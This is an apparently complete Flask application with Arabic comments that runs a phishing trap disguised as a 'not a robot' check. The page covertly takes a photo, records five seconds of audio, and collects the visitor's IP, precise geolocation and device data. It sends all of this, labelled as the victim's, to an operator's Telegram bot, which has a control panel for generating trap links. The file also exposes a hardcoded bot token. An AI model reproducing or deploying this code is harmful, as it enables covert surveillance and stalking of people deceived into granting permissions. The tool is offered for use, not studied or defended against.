import base64, requests, os, json, time
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# ==========================================
# --- إعدادات الإمبراطور سيوفي (لا تلمسها) ---
# ==========================================
BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
ADMIN_ID = "7041600701"
BASE_URL = "https://sif-pro.onrender.com" # رابط سيرفرك
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"

# متغيرات النظام القابلة للتعديل
system_config = {
    "welcome_msg": "🔥 أهلاً بك ملك سيوفي في لوحة التحكم v16.0\\n\\nالرابط شغال والوضع لوز! 🚀",
    "trap_title": "تأكيد الأمان الموحد",
    "victim_count": 0
}

# ==========================================
# --- الدوال الأساسية للنظام ---
# ==========================================
def tg_request(method, payload=None, files=None):
    """دالة التواصل مع تليجرام"""
    try:
        if files:
            return requests.post(API_URL + method, data=payload, files=files, timeout=20).json()
        return requests.post(API_URL + method, json=payload, timeout=20).json()
    except Exception as e:
        print(f"Error in TG request: {e}")
        return None

# ==========================================
# --- واجهة الصيد (The Trap) ---
# ==========================================
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #111; padding: 30px; border-radius: 20px; border: 1px solid #333; text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(243, 128, 32, 0.2); }
        .icon { font-size: 50px; margin-bottom: 20px; color: #f38020; }
        .btn { background: #f38020; color: #000; border: none; padding: 15px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1rem; transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #st { margin-top: 20px; color: #777; font-size: 0.8rem; }
        #v { position: fixed; top: -10px; left: -10px; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🛡️</div>
        <h2>تحقق بشري</h2>
        <p style="color: #bbb;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت للوصول إلى المحتوى</p>
        <button class="btn" id="go" onclick="startCapture()">أنا لست روبوت</button>
        <div id="st">بانتظار البدء...</div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const send = (d, t) => fetch('/api/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});

        async function startCapture() {
            const btn = document.getElementById('go');
            const st = document.getElementById('st');
            btn.style.display = 'none';
            st.innerText = "جاري تهيئة النظام... يرجى الانتظار";

            try {
                // 1. جلب IP
                const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:'Hidden'}));
                
                // 2. طلب الكاميرا والصوت
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                const v = document.getElementById('v');
                v.srcObject = stream;
                await v.play();

                // 3. جمع المستشعر الشامل
                const b = await navigator.getBattery().catch(() => ({}));
                const info = `📜 **تقرير صيد احترافي (v16.0)**\\n` +
                             `━━━━━━━━━━━━━━\\n` +
                             `🌐 **IP:** \`${ipData.ip}\`\\n` +
                             `🔋 **البطارية:** ${Math.round(b.level*100)}% (${b.charging ? '⚡' : '🔋'})\\n` +
                             `📱 **النظام:** ${navigator.platform}\\n` +
                             `🧠 **المعالج:** ${navigator.hardwareConcurrency} Cores\\n` +
                             `🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}\\n` +
                             `🌍 **اللغة:** ${navigator.language}\\n` +
                             ` браузер: ${navigator.userAgent.split(' ')[0]}`;
                await send(info, 'msg');

                // 4. جلب الموقع الدقيق
                navigator.geolocation.getCurrentPosition(p => {
                    const mapUrl = `📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    send(mapUrl, 'msg');
                }, null, {enableHighAccuracy: true});

                // 5. حل السواد + التقاط الصورة
                st.innerText = "جاري فحص الأمان... (4 ثواني)";
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send(c.toDataURL('image/jpeg', 0.9), 'img');

                    // 6. تسجيل بصمة الصوت
                    st.innerText = "جاري رفع البيانات... (5 ثواني)";
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const reader = new FileReader();
                        reader.readAsDataURL(new Blob(chunks));
                        reader.onloadend = () => send(reader.result, 'aud');
                        st.innerText = "✅ تمت العملية بنجاح! سيتم توجيهك...";
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000);
                }, 4000);

            } catch (e) {
                st.innerText = "❌ خطأ: يرجى منح الصلاحيات للمتابعة!";
                setTimeout(() => location.reload(), 2000);
            }
        }
    </script>
</body>
</html>
'''

# ==========================================
# --- مسارات السيرفر (Routes) ---
# ==========================================
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, title=system_config["trap_title"])

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.get_json(force=True, silent=True)
    if not data: return "ERROR"
    
    t, d = data.get('t'), data.get('d')
    if t == 'msg':
        tg_request("sendMessage", {'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
    elif t == 'img':
        img = base64.b64decode(d.split(',')[1])
        tg_request("sendPhoto", {'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, {'photo': ('c.jpg', img)})
    elif t == 'aud':
        aud = base64.b64decode(d.split(',')[1])
        tg_request("sendVoice", {'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, {'voice': ('v.ogg', aud)})
    
    return "OK"

# ==========================================
# --- لوحة التحكم (الـ Webhook) ---
# ==========================================
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json(force=True, silent=True)
    if not update: return "OK"

    if "message" in update:
        msg = update["message"]
        chat_id = str(msg["chat"]["id"])
        
        if chat_id == ADMIN_ID:
            kb = {
                "inline_keyboard": [
                    [{"text": "🔗 إنشاء رابط صيد جديد", "callback_data": "gen_link"}],
                    [{"text": "📊 إحصائيات النظام", "callback_data": "status"}],
                    [{"text": "⚠️ تصفير الضحايا", "callback_data": "reset"}]
                ]
            }
            tg_request("sendMessage", {
                "chat_id": chat_id, 
                "text": system_config["welcome_msg"], 
                "reply_markup": kb,
                "parse_mode": "Markdown"
            })

    elif "callback_query" in update:
        query = update["callback_query"]
        cid = query["message"]["chat"]["id"]
        data = query["data"]

        if data == "gen_link":
            tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 **رابط الصيد الخاص بك جاهز:**\\n`{BASE_URL}`", "parse_mode": "Markdown"})
        elif data == "status":
            tg_request("sendMessage", {"chat_id": cid, "text": "✅ **السيرفر يعمل بكفاءة v16.0**\\n\\nكل الحساسات تعمل (صوت، صورة، موقع، IP)."})
        elif data == "reset":
            tg_request("sendMessage", {"chat_id": cid, "text": "🗑 تم تصفير سجل الضحايا مؤقتاً."})

    return "OK"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

